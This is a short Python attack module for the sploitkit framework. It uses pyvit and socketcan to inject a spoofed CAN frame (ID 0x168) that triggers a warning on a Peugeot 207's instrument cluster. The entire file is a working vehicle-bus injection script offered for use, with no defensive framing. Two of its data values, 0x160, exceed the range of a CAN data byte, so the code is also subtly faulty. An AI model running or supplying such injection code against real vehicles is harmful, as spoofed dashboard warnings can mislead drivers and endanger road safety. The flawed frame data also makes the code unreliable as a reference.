from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class peugeot207_ic_warning(Module):
    """ This module triggers a warning on the instrument cluster of a Peugeot 207.

    Author:  shipcod3
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })

    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Sending a warning message to the Instrument Cluster")
        frame = can.Frame(0x168)
        frame.data = [0x160, 0, 0x160, 0, 0, 0, 0, 0]
        dev.send(frame)
        pass
